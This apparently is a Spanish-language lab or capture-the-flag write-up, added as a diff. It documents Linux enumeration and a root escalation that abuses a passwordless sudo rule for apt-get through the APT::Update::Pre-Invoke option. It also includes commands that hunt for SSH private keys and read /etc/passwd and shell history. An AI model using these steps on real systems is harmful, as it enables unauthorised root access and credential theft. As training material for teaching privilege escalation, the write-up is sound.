@@ -1,0 +1,150 @@
+Usuario que realizó la escalada:
+pbercoff
+
+Identificación del entorno
+
+Comando:
+pwd
+
+Motivo:
+Se utilizó para verificar el directorio actual del usuario comprometido y confirmar que se estaba trabajando desde su directorio personal.
+
+Comando:
+ls -la
+
+Motivo:
+Se utilizó para listar los archivos del directorio personal, incluyendo archivos ocultos. Esto permitió identificar elementos relevantes como .bash_history, .cache y archivos de configuración.
+
+Comando:
+uname -a
+
+Motivo:
+Se utilizó para obtener información sobre la versión del kernel y la arquitectura del sistema operativo, datos útiles para evaluar posibles vulnerabilidades locales.
+
+Comando:
+cat /etc/os-release
+
+Motivo:
+Permitió identificar que el sistema operativo era Ubuntu 22.04.2 LTS.
+
+Enumeración de usuarios
+
+Comando:
+cat /etc/passwd
+
+Motivo:
+Se utilizó para obtener la lista completa de usuarios presentes en el sistema y conocer sus directorios personales y shells configuradas.
+
+Comando:
+grep '/bin/bash' /etc/passwd
+
+Motivo:
+Permitió identificar los usuarios con acceso interactivo al sistema, reduciendo el conjunto de cuentas potencialmente relevantes para posteriores análisis.
+
+Enumeración de procesos y servicios
+
+Comando:
+ps aux
+
+Motivo:
+Se utilizó para identificar procesos en ejecución y servicios activos. Se observaron, entre otros, Apache, SSH, FTP y tareas programadas del sistema.
+
+Comando:
+ss -tulpn
+
+Motivo:
+Permitió enumerar los puertos abiertos y los servicios escuchando conexiones de red. Se identificaron los servicios SSH en el puerto 22, FTP en el puerto 21 y Apache en el puerto 80.
+
+Búsqueda de información útil
+
+Comando:
+find /home -type f 2>/dev/null
+
+Motivo:
+Se utilizó para localizar archivos accesibles pertenecientes a los usuarios del sistema y detectar posibles credenciales o configuraciones relevantes.
+
+Comando:
+cat ~/.bash_history
+
+Motivo:
+Permitió revisar el historial de comandos del usuario comprometido para obtener información sobre actividades previas realizadas en la máquina.
+
+Comando:
+ls -la ~/.ssh
+
+Motivo:
+Se utilizó para comprobar la existencia de claves SSH privadas o configuraciones de acceso remoto reutilizables.
+
+Comando:
+find / -name "id_rsa*" 2>/dev/null
+
+Motivo:
+Se utilizó para buscar claves privadas SSH almacenadas en cualquier ubicación accesible del sistema.
+
+Análisis de tareas programadas
+
+Comando:
+crontab -l
+
+Motivo:
+Permitió verificar si el usuario poseía tareas programadas propias que pudieran ser explotadas.
+
+Comando:
+ls -la /etc/cron*
+
+Motivo:
+Se utilizó para enumerar las tareas programadas globales del sistema.
+
+Comando:
+cat /etc/cron.d/backup
+
+Motivo:
+Permitió inspeccionar una tarea programada ejecutada como root que llamaba al script /opt/backup.sh cada minuto.
+
+Enumeración de privilegios sudo
+
+Comando:
+sudo -l
+
+Motivo:
+Se utilizó para identificar los comandos que el usuario podía ejecutar mediante sudo.
+
+Resultado relevante:
+(root) NOPASSWD: /usr/bin/dpkg, /usr/bin/apt-get
+
+La salida mostró que el usuario podía ejecutar apt-get y dpkg como root sin necesidad de contraseña, lo que representaba una posible vía de escalada de privilegios.
+
+Comando:
+sudo cat /etc/shadow
+
+Motivo:
+Se utilizó para comprobar si era posible acceder directamente a archivos sensibles mediante sudo.
+
+Resultado:
+El acceso fue denegado, confirmando que únicamente determinados comandos estaban autorizados.
+
+Escalada de privilegios
+
+Comando:
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
+
+Motivo:
+Se aprovechó la autorización para ejecutar apt-get como root. Mediante la opción APT::Update::Pre-Invoke fue posible lanzar una shell Bash antes de la actualización de paquetes, heredando los privilegios del proceso ejecutado por sudo.
+
+Resultado:
+Se obtuvo una shell interactiva con privilegios de root.
+
+Obtención de la evidencia
+
+Comando:
+cat /root/flag.txt
+
+Motivo:
+Se utilizó para verificar el acceso al directorio del superusuario y obtener el archivo solicitado por la práctica.
+
+Resultado:
+-yknf|q7?a_%sxd4^rvl*=9cg]j-o$i1
+
+Conclusión
+
+La escalada de privilegios fue posible debido a una configuración insegura de sudo que permitía al usuario pbercoff ejecutar apt-get como root sin contraseña. Aprovechando la funcionalidad APT::Update::Pre-Invoke fue posible ejecutar una shell Bash con privilegios elevados y obtener acceso completo al sistema.
